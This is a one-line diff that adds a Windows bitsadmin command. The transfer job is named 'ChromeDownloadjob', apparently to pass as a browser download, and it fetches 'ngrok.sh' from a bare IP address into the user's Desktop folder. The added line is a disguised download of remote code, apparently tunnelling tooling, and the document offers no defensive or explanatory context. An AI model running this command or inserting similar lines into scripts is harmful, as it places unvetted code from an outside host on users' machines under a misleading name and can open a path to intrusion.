@@ -1,0 +1,1 @@
+bitsadmin /transfer ChromeDownloadjob  /download /priority normal http://121.42.56.8/ngrok.sh  %UserProfile%\Desktop\ngrok.sh
